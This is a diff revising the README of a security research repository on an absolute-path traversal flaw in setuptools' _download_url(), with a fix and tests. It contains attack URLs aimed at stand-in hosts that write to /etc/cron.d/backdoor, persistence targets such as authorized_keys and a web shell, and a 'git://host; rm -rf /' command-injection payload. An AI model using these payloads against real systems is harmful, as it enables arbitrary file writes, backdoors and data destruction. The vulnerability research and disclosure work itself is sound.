@@ -1,132 +1,156 @@
 # Setuptools Path Traversal Vulnerability
 
-Security research demonstrating a path traversal vulnerability in setuptools `package_index.py`.
+**Arbitrary file write via absolute path injection in `package_index.py`**
+
+## Quick Start
+
+```bash
+# Run in Docker
+docker build -t setuptools-cve-poc .
+docker run --rm setuptools-cve-poc
+
+# Or locally (requires setuptools 78.1.0)
+pip install setuptools==78.1.0
+python poc_direct_download.py
+```
 
 ## Vulnerability Summary
 
 | Field | Value |
 |-------|-------|
-| **Affected Component** | `setuptools/package_index.py:810-823` |
-| **Vulnerable Function** | `PackageIndex._download_url()` |
-| **Vulnerability Type** | Path Traversal / Arbitrary File Write |
-| **Attack Vector** | Malicious package index with URL-encoded absolute paths |
-| **Affected Versions** | Tested on setuptools 78.1.0 (likely affects earlier versions) |
+| **Component** | `setuptools/package_index.py:810-825` |
+| **Function** | `PackageIndex._download_url()` |
+| **Type** | Path Traversal (CWE-22) |
+| **Impact** | Arbitrary File Write |
+| **Tested Version** | setuptools 78.1.0 |
 
-## Root Cause
-
-The `_download_url()` function sanitizes `..` directory traversal sequences but does **not** check for absolute paths:
+## The Bug
 
 ```python
-# setuptools/package_index.py lines 810-823
+# setuptools/package_index.py lines 810-825
+
 def _download_url(self, url, tmpdir):
-    name, _fragment = egg_info_for_url(url)
+    name, _fragment = egg_info_for_url(url)  # Returns "/etc/passwd" from %2Fetc%2Fpasswd
     if name:
         while '..' in name:
-            name = name.replace('..', '.').replace('\\', '_')
-    else:
-        name = "__downloaded__"
+            name = name.replace('..', '.').replace('\\', '_')  # Only sanitizes ".."
 
-    filename = os.path.join(tmpdir, name)  # VULNERABLE!
-    # When name is "/etc/passwd", os.path.join() ignores tmpdir entirely
+    filename = os.path.join(tmpdir, name)  # os.path.join ignores tmpdir when name is absolute!
+
+    return self._download_vcs(url, filename) or self._download_other(url, filename)
 ```
 
-When `os.path.join(tmpdir, "/absolute/path")` is called, Python ignores the first argument and returns just the absolute path.
+**Root Cause:** `os.path.join("/tmp/safe", "/etc/passwd")` returns `"/etc/passwd"` - the first argument is ignored when the second is absolute.
 
 ## Attack Flow
 
 ```
-Malicious URL: http://evil.com/packages/%2Fetc%2Fcron.d%2Fbackdoor
-                                        └──────────────────────────┘
-                                        URL-encoded: /etc/cron.d/backdoor
-                                                    ↓
-                        egg_info_for_url() decodes to: "/etc/cron.d/backdoor"
-                                                    ↓
-                        os.path.join("/tmp/xyz", "/etc/cron.d/backdoor")
-                                                    ↓
-                                    Returns: "/etc/cron.d/backdoor"
-                                                    ↓
-                                File written OUTSIDE temp directory!
+Malicious URL                         Extracted Filename         Final Path
+─────────────────────────────────     ──────────────────         ──────────────────
+http://evil/%2Fetc%2Fcron.d%2Fjob  →  /etc/cron.d/job         →  /etc/cron.d/job
+             └─────────┬─────────┘
+            URL-encoded absolute path
+            decoded by egg_info_for_url()
 ```
 
-## Proof of Concept Files
+## Proof of Concept
+
+```
+$ python poc_direct_download.py
+
+=================================================================
+DIRECT PROOF: _download_url() path traversal vulnerability
+=================================================================
+
+[1] Malicious URL: http://127.0.0.1:35737/pkg/%2Ftmp%2FCVE_PROOF.txt
+    Last component: %2Ftmp%2FCVE_PROOF.txt
+
+[2] egg_info_for_url() extracts: '/tmp/CVE_PROOF.txt'
+
+[3] Intended download dir: /tmp/tmp1uygg9cz
+    os.path.join(tmpdir, name) = '/tmp/CVE_PROOF.txt'
+    ^^^ tmpdir is IGNORED because name is absolute!
+
+[4] Calling PackageIndex()._download_url(url, tmpdir)...
+    Returned: /tmp/CVE_PROOF.txt
+
+[5] Checking /tmp/CVE_PROOF.txt...
+
+=================================================================
+VULNERABILITY CONFIRMED!
+=================================================================
+File written to: /tmp/CVE_PROOF.txt
+```
+
+## Files
 
 | File | Description |
 |------|-------------|
-| `poc_path_traversal.py` | Simple PoC - writes to `/tmp/PROOF.txt` |
-| `poc_direct_download.py` | Direct `_download_url()` exploit |
-| `poc_realistic_attack.py` | Simulated malicious package index |
-| `poc_full_easy_install.py` | Full easy_install attack chain |
-| `malicious_index_server.py` | Standalone malicious PyPI server |
-| `test_path_traversal_security.py` | 45 security test cases |
+| [RESEARCH.md](RESEARCH.md) | **Deep dive technical analysis** |
+| [poc_direct_download.py](poc_direct_download.py) | Simplest PoC - direct function call |
+| [poc_path_traversal.py](poc_path_traversal.py) | Basic PoC with HTTP server |
+| [poc_realistic_attack.py](poc_realistic_attack.py) | Simulated malicious package index |
+| [poc_full_easy_install.py](poc_full_easy_install.py) | Full easy_install attack chain |
+| [malicious_index_server.py](malicious_index_server.py) | Standalone malicious PyPI server |
+| [test_path_traversal_security.py](test_path_traversal_security.py) | 45 security test cases |
+| [Dockerfile](Dockerfile) | Containerized PoC |
 
-## Running the PoCs
+## Attack Scenarios
 
-```bash
-# Simple proof - writes /tmp/PROOF.txt
-python poc_path_traversal.py
-
-# Direct function exploit - writes /tmp/CVE_PROOF.txt
-python poc_direct_download.py
-
-# Realistic attack simulation
-python poc_realistic_attack.py
-
-# Full easy_install simulation
-python poc_full_easy_install.py
-```
-
-## Most Likely Attack Scenarios
-
-### 1. Compromised Private Package Index (HIGH likelihood)
-
-Many enterprises run internal PyPI mirrors (Artifactory, DevPI, Nexus). If compromised:
+### 1. Compromised Private Package Index (Most Likely)
 
 ```bash
-# Victim's pip.conf
+# Enterprise pip.conf
 [global]
 index-url = https://pypi.internal.company.com/simple/
 
-# Attacker serves malicious link:
+# Attacker compromises internal index, serves:
 # <a href="/%2Fetc%2Fcron.d%2Fbackdoor">requests-2.28.0.tar.gz</a>
 
-# Victim updates packages normally:
+# Developer updates packages:
 pip install --upgrade requests
-# Result: /etc/cron.d/backdoor written with attacker's payload
+# Result: /etc/cron.d/backdoor written with attacker payload
 ```
 
-### 2. Dependency Confusion with Legacy Tools (MEDIUM-HIGH likelihood)
+### 2. Dependency Confusion with Legacy Tools
 
-```python
-# Attacker registers internal package name on public PyPI
-# with malicious dependency_links
+```bash
+# Attacker registers "internal-company-lib" on public PyPI
+# Package metadata contains malicious URLs
 
 # Victim's legacy build system:
-easy_install company-internal-utils
-# or
-python setup.py install
-
+easy_install internal-company-lib
 # Result: Arbitrary file written via path traversal
 ```
 
 ## Impact
 
-An attacker could write files to arbitrary locations, including:
+An attacker can write files to any location writable by the user:
 
-- `/etc/cron.d/backdoor` - Scheduled reverse shell
-- `~/.ssh/authorized_keys` - SSH access
-- `~/.bashrc` - Code execution on login
-- `/var/www/html/shell.php` - Web shell
+| Target | Impact |
+|--------|--------|
+| `/etc/cron.d/backdoor` | Scheduled reverse shell |
+| `~/.ssh/authorized_keys` | SSH access |
+| `~/.bashrc` | Code execution on login |
+| `/var/www/html/shell.php` | Web shell |
 
-## Affected Code Paths
+## Affected Code Path
 
-| Entry Point | Vulnerable? | Notes |
-|-------------|-------------|-------|
-| `PackageIndex._download_url()` | **YES** | Directly exploitable |
-| `PackageIndex._download_other()` | **YES** | Calls `_download_url()` |
-| `easy_install` | Potential | Uses PackageIndex |
-| `pip install` | No | Uses own download mechanism |
+```
+PackageIndex._download_url()     ← Vulnerable function
+    │
+    ├── egg_info_for_url()       ← Extracts & decodes filename
+    │
+    ├── while '..' in name       ← Only sanitizes "..", not absolute paths
+    │
+    ├── os.path.join()           ← Ignores tmpdir for absolute paths
+    │
+    └── _download_other()
+            │
+            └── _download_to()   ← Writes file to attacker-controlled path
+```
 
-## Recommended Fix
+## Fix
 
 ```python
 def _download_url(self, url, tmpdir):
@@ -134,9 +158,11 @@ def _download_url(self, url, tmpdir):
     if name:
         while '..' in name:
             name = name.replace('..', '.').replace('\\', '_')
+
         # FIX: Strip absolute path prefixes
         if os.path.isabs(name):
             name = name.lstrip('/\\')
+
         # FIX: Handle Windows drive letters
         if len(name) > 1 and name[1] == ':':
             name = name[0] + '_' + name[2:]
@@ -145,7 +171,7 @@ def _download_url(self, url, tmpdir):
 
     filename = os.path.join(tmpdir, name)
 
-    # FIX: Final validation
+    # FIX: Validate path is under tmpdir
     if not os.path.realpath(filename).startswith(os.path.realpath(tmpdir) + os.sep):
         raise DistutilsError(f"Path escapes download directory: {filename}")
 
@@ -156,24 +182,32 @@ def _download_url(self, url, tmpdir):
 
 ```
 $ python -m pytest test_path_traversal_security.py -v
+
 =================== 40 passed, 4 skipped, 1 xfailed ===================
 
-- 40 tests document current vulnerable behavior
-- 4 skipped (Windows-specific tests on Linux)
-- 1 xfailed (will pass once vulnerability is fixed)
+- 40 passed: Document current vulnerable behavior
+- 4 skipped: Windows-specific tests (on Linux)
+- 1 xfailed: Will pass once vulnerability is fixed
 ```
 
-## Timeline
+## Related Work
 
-- **2025-01-31**: Vulnerability discovered and documented
-- **Status**: Pending disclosure to setuptools maintainers
+This is a **different vulnerability** from the March 2024 command injection report:
 
-## Disclaimer
-
-This research is for educational and authorized security testing purposes only. Do not use these techniques maliciously.
+| | March 2024 Report | This Research |
+|--|-------------------|---------------|
+| **Type** | Command Injection | Path Traversal |
+| **Vector** | Shell metacharacters in git:// URLs | URL-encoded absolute paths |
+| **Payload** | `git://host; rm -rf /` | `http://host/%2Fetc%2Fpasswd` |
+| **Root Cause** | Unsanitized shell execution | Missing absolute path check |
 
 ## References
 
-- [setuptools GitHub](https://github.com/pypa/setuptools)
+- [RESEARCH.md](RESEARCH.md) - Full technical deep dive
 - [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
-- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [Python os.path.join docs](https://docs.python.org/3/library/os.path.html#os.path.join)
+- [setuptools GitHub](https://github.com/pypa/setuptools)
+
+## Disclaimer
+
+This research is for educational and authorized security testing purposes only.
